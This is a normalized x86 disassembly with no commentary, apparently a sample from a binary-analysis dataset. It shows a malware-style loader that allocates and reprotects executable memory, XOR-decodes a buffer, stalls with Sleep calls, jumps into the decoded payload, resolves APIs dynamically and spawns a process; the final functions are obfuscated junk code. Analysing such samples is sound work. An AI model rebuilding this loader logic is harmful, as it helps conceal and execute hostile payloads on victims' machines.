sub_401000
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push esi
push edi
mov edi [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ edi + 0x30 ] eax
mov eax [ ebp + 0x14 ]
mov [ edi + 0x34 ] eax
lea eax [ edi + 0x18 ]
push eax
push edi
push sub_401123
push ecx
call sub_410200
mov esi eax
add esp 0x10
test esi esi
je r-xdata
lea ecx [ edi + 0x20 ]
mov ecx [ edi + 0x4 ]
movzx eax [ ecx ]
push eax
push ecx
push 0x2
push edi
call sub_40105d
add esp 0x10
jle r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
movzx esi si
or esi 0x80070000
jmp r-xdata
sub_40105d
push ebp
mov ebp esp
push [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push [ eax + 0x18 ]
call sub_410240
add esp 0x14
test eax eax
jle r-xdata
pop ebp
retn
movzx eax ax
or eax 0x80070000
sub_401088
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_410283
and [ esi + 0x18 ] 0x0
and [ esi + 0x1c ] 0x0
pop ecx
pop ecx
pop esi
pop ebp
retn
sub_4010a7
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
push esi
mov esi r--data
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edx + 0x1 ]
and [ ecx + 0x4 ] 0x0
and [ ecx + 0xc ] 0x0
mov [ ecx ] esi
mov [ ecx + 0x8 ] eax
pop esi
pop ebp
retn
mov edx eax
mov esi eax
lea ecx [ edx + 0x1 ]
mov al [ edx ]
inc edx
test al al
jne r-xdata
sub edx ecx
sub_4010df
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
push edi
xor edi edi
mov esi r--data
mov edx edi
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ edx * 2 + 0x2 ]
mov [ ecx + 0x4 ] edi
mov [ ecx + 0xc ] edi
pop edi
mov [ ecx ] esi
mov [ ecx + 0x8 ] eax
pop esi
pop ebp
retn
mov edx eax
mov esi eax
lea ecx [ edx + 0x2 ]
mov ax [ edx ]
add edx 0x2
cmp ax di
jne r-xdata
sub edx ecx
sar edx 0x1
sub_401123
push ebp
mov ebp esp
mov eax [ ebp + 0x28 ]
test eax eax
je r-xdata
pop ebp
retn 0x24
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x1c ]
push edi
mov edi [ ebp + 0x20 ]
sub ecx 0x0
je r-xdata
and [ eax ] 0x0
sub ecx 0x1
jne r-xdata
pop esi
pop edi
pop ebx
push [ eax + 0x34 ]
push [ ebp + 0x24 ]
push edi
push ebx
push ecx
push [ ebp + 0x14 ]
mov ecx esi
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call j_sub_40d468
call esi
mov ecx [ ebp + 0x18 ]
test dl dl
je r-xdata
mov ecx 0x100
movzx ecx dl
inc ecx
jmp r-xdata
push esi
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov [ eax ] ecx
mov ecx [ ebp + 0x14 ]
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x18 ]
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ebx
mov [ eax + 0x14 ] edi
jmp r-xdata
sub_40119b
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
or eax [ ebp + 0x10 ]
je r-xdata
mov al 0x1
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov ecx [ edx + 0x8 ]
mov eax [ edx + 0xc ]
and ecx [ ebp + 0xc ]
and eax [ ebp + 0x10 ]
or ecx eax
je r-xdata
xor al al
pop ebp
retn
mov eax [ edx + 0x10 ]
mov ecx [ edx + 0x14 ]
and eax [ ebp + 0xc ]
and ecx [ ebp + 0x10 ]
cmp eax [ edx + 0x10 ]
jne r-xdata
cmp ecx [ edx + 0x14 ]
je r-xdata
sub_4011d7
push ebp
mov ebp esp
sub esp 0x10
mov al [ r--data ]
mov edx [ ebp + 0xc ]
mov ecx edx
push esi
mov esi [ ebp + 0x8 ]
sub ecx r--data
or ecx 0xb000000
mov eax [ edx ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x8 ]
add edx 0xc
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x4 ]
push ecx
and [ ecx + 0x4 ] 0x0
push [ ebp + 0x18 ]
mov [ ecx ] eax
mov eax [ esi + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
movzx eax [ eax ]
and [ ecx + 0x14 ] 0x0
mov [ ecx + 0x8 ] eax
mov [ ecx + 0xc ] 0x2
mov [ ecx + 0x10 ] edx
movzx eax [ edx ]
mov [ ecx + 0x18 ] eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ecx + 0x1c ] 0x1
push [ esi + 0x1c ]
push [ esi + 0x18 ]
call sub_4102bd
add esp 0x1c
pop esi
mov esp ebp
pop ebp
retn
sub_401260
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
push 0x7dc
push 0x0
mov [ esi ] eax
lea eax [ esi + 0x4 ]
push eax
call sub_40de60
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x4
sub_4012f0
push ebp
mov ebp esp
push 0xffffffff
push sub_44cde2
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ebx [ ebp + 0xc ]
lea eax [ ebx + 0x7dc ]
push eax
mov [ ebp - 0x10 ] eax
call sub_40c3a5
mov edi eax
mov [ ebp + 0xc ] eax
add esi 0x4
mov ecx 0x1f7
push ebx
push [ ebp + 0x8 ]
[ edi ] [ esi ]
lea ecx [ eax + 0x7dc ]
push ecx
call sub_40d8e0
push 0x318
call sub_40c364
add esp 0x14
mov [ ebp + 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edi edi
mov ecx eax
call sub_4015f0
mov edi eax
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push eax
call sub_40c3a5
add esp 0x4
mov esi eax
mov ecx edi
push esi
push [ ebp - 0x10 ]
push ebx
call sub_401710
push eax
push esi
push r--data
mov ecx edi
call sub_4017f0
push 0x0
push 0x1
push 0x1
mov ecx edi
mov [ ebp - 0x4 ] 0xffffffff
call sub_4017b0
push 0x0
lea eax [ ebx + 0x7dc ]
mov ecx edi
mov ebx [ ebp + 0xc ]
push eax
push ebx
call sub_401710
test eax eax
je r-xdata
sub_401400
push ebp
mov ebp esp
push 0xffffffff
push sub_44ce20
mov eax [ fs : 0x0 ]
push eax
mov eax 0x1028
call sub_40c3c0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push 0x208
mov [ ebp - 0x1028 ] eax
call sub_40c3a5
push 0x318
call sub_40c364
add esp 0x8
mov [ ebp - 0x102c ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor eax eax
mov ecx eax
call sub_4015f0
jmp r-xdata
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x3e8
call edi
push 0x0
call sub_417184
int3
push 0x0
push 0x0
push ebx
mov ecx eax
call sub_4016b0
push 0x40
push 0x3000
push eax
push 0x0
mov [ ebp - 0x1030 ] eax
call [ VirtualAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov edi [ Sleep@IAT ]
mov [ ebp - 0x102c ] eax
mov [ ebp - 0x4 ] 0xffffffff
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x102c ]
push esi
push 0x0
push ebx
call sub_4016b0
test eax eax
je r-xdata
push [ ebp - 0x1030 ]
call sub_40c3a5
add esp 0x4
mov esi eax
lea eax [ ebp - 0x1034 ]
push eax
push 0x40
push [ ebp - 0x1030 ]
push esi
call [ VirtualProtect@IAT ]
cmp [ esi ] 0x0
je r-xdata
lea eax [ esi + 0x7dc ]
xor esi esi
mov [ ebp - 0x1028 ] eax
lea ebx [ ebp - 0x10 ]
push [ ebp - 0x1028 ]
lea ecx [ ebp - 0x1024 ]
call sub_401a90
push esi
lea ecx [ ebp - 0x1024 ]
mov [ ebp - 0x4 ] 0x1
call sub_401cd0
lea ecx [ ebp - 0x1024 ]
call sub_401e10
lea ecx [ ebp - 0x1024 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_401b30
push 0x1
call edi
mov eax [ ebx ]
lea ebx [ ebx - 0x4 ]
add eax 0x10
xor eax [ ebp + esi * 4 - 0x420 ]
xor eax 0x8f
mov [ ebp + esi * 4 - 0x420 ] eax
inc esi
cmp esi 0x104
jl r-xdata
cmp [ ebp - 0x41c ] 0x2710
je r-xdata
push 0xffffffff
call edi
call [ ebp - 0x1028 ]
sub_4015c0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
lea edi [ ecx + 0x4 ]
mov ecx 0x1f7
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
retn 0x4
sub_401620
push esi
push edi
push 0x0
mov edi ecx
call sub_4291e1
push eax
call sub_4171d1
add esp 0x8
call sub_4171b0
xor esi esi
movd xmm0 eax
cvtdq2pd xmm0 xmm0
divsd xmm0 [ r--data ]
mulsd xmm0 [ r--data ]
addsd xmm0 [ r--data ]
cvttsd2si eax xmm0
mov [ edi + 0x104 ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
retn
nop [ eax ] eax
call sub_4171b0
movd xmm0 eax
cvtdq2pd xmm0 xmm0
divsd xmm0 [ r--data ]
mulsd xmm0 [ r--data ]
addsd xmm0 [ r--data ]
cvttsd2si ecx xmm0
mov [ esi + edi ] cl
inc esi
cmp esi [ edi + 0x104 ]
jb r-xdata
sub_4016b0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov esi edi
mov eax [ edi + 0x4 ]
mov [ ebx + 0x104 ] eax
push [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
add eax edi
push eax
push ebx
call sub_40d8e0
add edi [ edi + 0x10 ]
add esp 0xc
mov eax [ esi ]
mov ecx [ esi + 0xc ]
mov [ ebx + 0x10c ] eax
sub eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push [ ebp + 0x10 ]
push ecx
push edi
mov ecx ebx
call sub_4018c0
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_401710
push ebp
mov ebp esp
push ebx
push edi
mov edi ecx
cmp [ edi + 0x108 ] 0x0
je r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
call sub_401620
mov eax [ edi + 0x10c ]
sub eax 0x1
jne r-xdata
mov eax [ edi + 0x10c ]
mov [ ebx ] eax
mov eax [ edi + 0x104 ]
mov [ ebx + 0x4 ] eax
mov ecx [ ebx + 0x4 ]
mov eax [ ebp + 0xc ]
push esi
mov [ ebx + 0xc ] eax
lea eax [ ecx + 0x14 ]
mov [ ebx + 0x8 ] 0x14
push ecx
mov [ ebx + 0x10 ] eax
lea eax [ ebx + 0x14 ]
push edi
push eax
call sub_40d8e0
add esp 0xc
add ebx [ ebx + 0x10 ]
pop esi
mov eax [ edi + 0x104 ]
mov ecx [ ebp + 0xc ]
add eax 0x14
pop edi
add eax ecx
pop ebx
pop ebp
retn 0xc
push ebx
push [ ebp + 0xc ]
mov ecx edi
push [ ebp + 0x8 ]
call sub_401950
mov ecx eax
mov eax [ edi + 0x104 ]
add eax 0x14
pop edi
add eax ecx
pop ebx
pop ebp
retn 0xc
sub_4017b0
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x108 ] al
mov eax [ ebp + 0xc ]
push 0x104
push [ ebp + 0x10 ]
mov [ ecx + 0x10c ] eax
lea eax [ ecx + 0x110 ]
push eax
call [ lstrcpynW@IAT ]
mov eax 0x1
pop ebp
retn 0xc
sub_4017f0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
push r--data
push eax
lea eax [ ebp - 0x14 ]
push eax
call sub_4176c9
push [ ebp - 0x14 ]
push 0x1f
push 0x1
push r--data
call sub_417b3e
mov edi [ ebp + 0x10 ]
add esp 0x1c
xor esi esi
test edi edi
je r-xdata
push [ ebp - 0x14 ]
push 0x6
push 0x1
push r--data
call sub_417b3e
push [ ebp - 0x14 ]
call sub_4177a4
add esp 0x14
push 0x0
push 0x0
push r--data
push 0x0
call [ MessageBoxW@IAT ]
push 0x0
call sub_417184
int3
mov al [ ebx + esi ]
xorps xmm0 xmm0
cmp al 0x10
mov [ ebp - 0x10 ] 0x10
movzx eax al
push eax
movq [ ebp - 0xf ] xmm0
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x7 ] 0x0
jae r-xdata
push r--data
push eax
call sub_401a10
add esp 0xc
push r--data
push 0xa
push eax
call sub_401a50
add esp 0x10
jmp r-xdata
push [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
push 0x5
push 0x1
push eax
call sub_417b3e
inc esi
add esp 0x10
cmp esi edi
jb r-xdata
sub_4018c0
push ebp
mov ebp esp
sub esp 0x8
mov eax ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ eax + 0x104 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
test edi edi
jne r-xdata
push esi
xor esi esi
test eax eax
je r-xdata
pop edi
add eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0xc
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
add eax 0xffffffec
sub ecx edi
mov [ ebp - 0x8 ] eax
mov [ ebp + 0x8 ] ecx
nop [ eax ] eax
cmp esi [ ebp - 0x8 ]
jbe r-xdata
lea edx [ esi + edi ]
mov edi [ ebp - 0x4 ]
mov cl [ ecx + edx ]
xor cl [ eax + edi ]
inc eax
mov edi [ ebp + 0x10 ]
mov [ edx ] cl
mov ecx [ ebp + 0x8 ]
cmp eax ebx
jb r-xdata
mov eax [ ebp + 0xc ]
inc esi
mov ecx [ ebp + 0x8 ]
cmp esi eax
jb r-xdata
push edi
push r--data
call sub_4019e0
add esp 0x8
xor eax eax
test ebx ebx
je r-xdata
sub_401950
push ebp
mov ebp esp
sub esp 0x8
mov eax ecx
push ebx
push edi
mov edi [ ebp + 0x10 ]
mov ebx [ eax + 0x104 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
test edi edi
je r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn 0xc
push esi
xor esi esi
test eax eax
je r-xdata
pop esi
mov ecx [ ebp + 0x8 ]
add eax 0xffffffec
sub ecx edi
mov [ ebp - 0x8 ] eax
mov [ ebp + 0x8 ] ecx
cmp esi [ ebp - 0x8 ]
jbe r-xdata
nop [ eax + eax ] eax
mov eax [ ebp + 0xc ]
inc esi
mov ecx [ ebp + 0x8 ]
cmp esi eax
jb r-xdata
push edi
push r--data
call sub_4019e0
add esp 0x8
lea edx [ esi + edi ]
mov edi [ ebp - 0x4 ]
mov cl [ ecx + edx ]
xor cl [ eax + edi ]
inc eax
mov edi [ ebp + 0x10 ]
mov [ edx ] cl
mov ecx [ ebp + 0x8 ]
cmp eax ebx
jb r-xdata
xor eax eax
test ebx ebx
je r-xdata
sub_4019e0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push 0x1
call sub_41730a
add esp 0x4
lea ecx [ ebp + 0xc ]
push ecx
push 0x0
push esi
push eax
call sub_4019d0
push [ eax + 0x4 ]
push [ eax ]
call sub_428c51
add esp 0x18
pop esi
pop ebp
retn
sub_401a10
push ebp
mov ebp esp
lea eax [ ebp + 0x10 ]
push eax
push 0x0
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_4019d0
mov ecx [ eax ]
push [ eax + 0x4 ]
or ecx 0x1
push ecx
call sub_428f69
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
pop ebp
retn
sub_401a50
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4019d0
push [ eax + 0x4 ]
push [ eax ]
call sub_428fb1
or ecx 0xffffffff
add esp 0x1c
test eax eax
cmovs eax ecx
pop ebp
retn
sub_401a90
push ebp
mov ebp esp
push ebx
mov ebx ecx
push esi
push 0x104
lea eax [ ebx + 0x14 ]
mov [ ebx + 0xc00 ] 0x0
push eax
push [ ebp + 0x8 ]
call [ GetModuleFileNameW@IAT ]
push r--data
call [ LoadLibraryA@IAT ]
push r--data
push eax
mov [ ebx ] eax
call [ GetProcAddress@IAT ]
push r--data
push [ ebx ]
mov esi eax
call [ GetProcAddress@IAT ]
push r--data
push [ ebx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] esi
call eax
mov [ ebx + 0x4 ] eax
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
sub_401b40
push ebp
mov ebp esp
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov edi ecx
lea eax [ edi + 0x21c ]
push eax
call [ lstrlenW@IAT ]
mov eax [ edi + 0x4 ]
push r--data
call eax
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor eax eax
pop edi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x8 ]
push esi
push r--data
push [ edi ]
call ecx
push r--data
mov esi eax
mov eax [ edi + 0x8 ]
push ebx
call eax
test esi esi
je r-xdata
pop esi
pop edi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
xor eax eax
push 0x206
push eax
mov [ ebp - 0x20c ] ax
lea eax [ ebp - 0x20a ]
push eax
call sub_40de60
add esp 0xc
lea eax [ ebp - 0x20c ]
push 0x104
push r--data
push eax
call [ lstrcpynW@IAT ]
mov eax [ edi + 0x42c ]
mov esi [ lstrcatW@IAT ]
cmp eax 0x80000001
jne r-xdata
cmp eax 0x80000002
jne r-xdata
push r--data
jmp r-xdata
lea eax [ edi + 0x430 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
lea eax [ edi + 0x624 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
lea eax [ edi + 0x21c ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call esi
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
push 0x40
lea eax [ ebp - 0x25c ]
mov [ ebp - 0x260 ] 0x44
push 0x0
push eax
call sub_40de60
add esp 0xc
lea eax [ ebp - 0x21c ]
push eax
lea eax [ ebp - 0x260 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x20c ]
push eax
push 0x0
call [ CreateProcessW@IAT ]
push r--data
lea eax [ ebp - 0x20c ]
push eax
call esi
sub_401cd0
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
push 0x7dc
push 0x0
lea edi [ ebx + 0x424 ]
push edi
call sub_40de60
mov esi [ ebp + 0x8 ]
add esp 0xc
mov ecx 0x1f7
[ edi ] [ esi ]
lea esi [ ebx + 0x818 ]
push esi
call [ lstrlenW@IAT ]
sub eax 0x1
js r-xdata
cmp [ esi ] 0x25
jne r-xdata
lea ecx [ ebx + 0x818 ]
lea ecx [ ecx + eax * 2 ]
lea eax [ ebx + 0xa0c ]
push eax
push esi
add esi 0x2
push r--data
push esi
call sub_40dfba
add esp 0x8
test eax eax
je r-xdata
xor edx edx
mov [ ecx ] dx
sub ecx 0x2
sub eax 0x1
jns r-xdata
mov ecx [ ebp - 0x4 ]
mov eax 0x1
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c3ae
mov esp ebp
pop ebp
retn 0x4
push r--data
push esi
call sub_40dfba
mov edi eax
add esp 0x8
sub edi esi
sar edi 0x1
je r-xdata
cmp [ ecx ] 0x5c
jne r-xdata
push 0x208
lea eax [ ebp - 0x20c ]
push 0x0
push eax
call sub_40de60
add esp 0xc
xor eax eax
mov [ esi + edi * 2 ] ax
mov eax [ ebx + 0x8 ]
push r--data
push [ ebx ]
call eax
push 0x104
lea ecx [ ebp - 0x20c ]
push ecx
push esi
call eax
mov eax 0x25
mov [ esi + edi * 2 ] ax
lea eax [ esi + 0x2 ]
lea eax [ eax + edi * 2 ]
push eax
lea eax [ ebp - 0x20c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebx + 0xa0c ]
push eax
lea eax [ ebp - 0x20c ]
push eax
jmp r-xdata
push r--data
lea eax [ ebx + 0x21c ]
push 0x104
push eax
call sub_404a20
add esp 0x14
sub_401e10
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x60 ] ecx
call sub_4171b0
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x80 ] 0x0
mov [ ebp - 0x64 ] 0x0
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x5c ]
add eax 0x1
mov [ ebp - 0x5c ] eax
cmp [ ebp - 0x5c ] 0x3e8
je r-xdata
mov eax [ ebp - 0x80 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_40c3ae
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] 0x0
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x68 ]
cmp edx [ ebp - 0x5c ]
jae r-xdata
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov ecx [ ebp - 0x64 ]
cmp ecx [ ebp - 0x5c ]
je r-xdata
mov eax [ ebp - 0x64 ]
add eax [ ebp - 0x68 ]
mov [ ebp - 0x64 ] eax
jmp r-xdata
cmp [ ebp - 0x64 ] 0x1
je r-xdata
call sub_4171b0
cdq
mov ecx 0x7fff
idiv ecx
imul edx eax 0xfffff83a
add edx 0xa
mov [ ebp - 0x64 ] edx
mov ecx [ ebp - 0x68 ]
add ecx 0x1
mov [ ebp - 0x68 ] ecx
mov eax [ ebp - 0x60 ]
add eax 0x21c
push eax
mov ecx [ ebp - 0x60 ]
add ecx 0x14
push ecx
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x94 ] eax
mov [ ebp - 0x98 ] ecx
mov [ ebp - 0x6c ] edx
push esi
push ebx
sub esp 0x10
call sub_40259c
retn 0x50
sub_401f24
jne r-xdata
jno r-xdata
or edi 0x9a890f
add [ eax ] al
add esp 0x8
jno r-xdata
sub edx 0x11e890f
add [ eax ] al
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c6
pop edx
jno r-xdata
mov ecx 0xe981637f
jae r-xdata
sub ecx 0xe1813e75
add [ eax + eax - 0x7af10000 ] 0xea810971
jns r-xdata
call [ 0x40246c81 ]
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
jns r-xdata
jge 0xffffffffb8af9f26
pushfd
call sub_401f0f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
push ebp
call sub_401f24
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
or edi 0x8d0f2c73
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
pop ecx
jno r-xdata
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
jg r-xdata
jne 0x24c12fef
jne r-xdata
call sub_401faf
ja 0x504a3b6
call 0x529077ef
add esp 0x4
jns r-xdata
mov eax 0xc7819173
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jns r-xdata
jmp 0xcaa8cf
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
add esp 0x4
jne r-xdata
jg 0xffffffffff96a326
pop eax
jns r-xdata
sub eax 0xfec5e89c
jns r-xdata
xor edx 0x81257159
r-xdata
jno 0x16400d69
pop edx
jg r-xdata
jpo 0xf70988c
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
ja r-xdata
and ecx 0xf681ad79
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
add esp 0x4
jno r-xdata
je 0xfffffffffed0a398
jne r-xdata
jno 0xffffffff834f7793
jae r-xdata
je 0xffffffff814fc165
jne 0xffffffffeac128bf
clc
add [ eax ] al
add [ edi ] cl
test [ ebx - 0x7ef0fb3c ] eax
test [ eax ] al
add [ eax ] al
jg r-xdata
jg 0xffffffff9c94739a
ja r-xdata
jns r-xdata
push esi
push esi
call sub_40209a
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7991
push edx
call sub_401fd0
or edi 0x830f5858
jne r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
jae r-xdata
je 0xffffffffa3a4c565
call sub_40204f
xor edi 0x517f5859
jno 0xfffffffff2c17b0c
push ecx
push ebx
call sub_401f9f
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
sub_401f9f
jns r-xdata
jns r-xdata
xor esi 0x58b93d7f
jno r-xdata
push ebp
call sub_401f24
mov [ fs : ebx - 0x7af0fb3c ] eax
mov esp 0xffffffe
test [ edi ] cl
adc [ eax + 0x5fffffe ] 0x59
sub eax 0xf08c483
xor [ ebx ] 0xb9000001
jae r-xdata
jno 0x73987a0b
jg r-xdata
jne 0x24c12fef
jae r-xdata
sub ecx 0xe1813e75
pop eax
jae r-xdata
add eax 0xf9b7159
test [ edx + 0xf ] ebx
and [ edi + edi * 8 ] 0x15ffffff
or [ 0xffffffffff6d830f ] 0xfe9ffff
mov [ edx - 0x7f000000 ] ecx
iretd
jne r-xdata
and eax 0x8b0f327f
pop eax
pop ecx
jge r-xdata
jns r-xdata
jge 0xffffffffb8af9f26
pushfd
call sub_401f0f
mov eax [ fs : 0xffffffff9ce8c173 ]
push edi
push eax
push edx
call sub_401faf
ja 0x504a3b6
call [ 0x29e85351 ]
add [ eax ] al
add [ ecx + 0x515557e9 ] al
ja r-xdata
and ebx 0xcf812475
jno r-xdata
pop ecx
or eax 0xf04c483
mov ebp ebp
jno r-xdata
jmp [ 0xffffffff8f0f3973 ]
jae r-xdata
jae r-xdata
pop ecx
jno r-xdata
pop eax
jge r-xdata
call [ 0x25ff9e79 ]
pop edx
jg r-xdata
jpo 0xf70988c
jae r-xdata
sub eax 0x4d795a58
jg r-xdata
add edi 0x848f0f
add [ eax ] al
sub ecx 0x811f755a
pop eax
pop edx
jns r-xdata
mov esi 0x55559c9c
jae r-xdata
xor edx 0x8a810f
add [ eax ] al
jae r-xdata
je 0xffffffffa3a4c565
jg r-xdata
jg 0xffffffff9c94739a
add esp 0x4
jns r-xdata
mov eax 0xc7819173
sbb [ edx + 0x58 ] 0xf8830f
add [ eax ] al
jne 0xf44e3c6
push eax
push edi
push ebp
push ecx
and ecx 0xff378f0f
jg r-xdata
mov ecx 0xd8810f58
add [ eax ] al
add [ edi ] cl
sbb [ eax + 0x5a ] 0xd817358
ja r-xdata
and ecx 0xf681ad79
jns r-xdata
jmp 0xcaa8cf
call sub_40204f
xor edi 0x517f5859
jno 0xfffffffff2c17b0c
push ecx
push ebx
call sub_401f9f
sub ecx 0x50515557
and esi 0x73595958
out 0x81 al
0x830f
jns r-xdata
push esi
push esi
call sub_40209a
sub ebx 0xfeace855
pushfd
pushfd
push ebp
push ebp
jpo 0x53bd7991
push edx
call sub_401fd0
or edi 0x830f5858
jne r-xdata
pop eax
jns r-xdata
sub eax 0xfec5e89c
add [ eax + eax - 0x7af10000 ] 0xea810971
jg r-xdata
mov [ fs : 0xffffffff840f0e79 ] eax
jno 0x16400d69
jae r-xdata
je 0xffffffff814fc165
jne r-xdata
jno 0xffffffff834f7793
xor edx 0x81257159
r-xdata
jg r-xdata
and ecx 0xd7850f
add [ eax ] al
clc
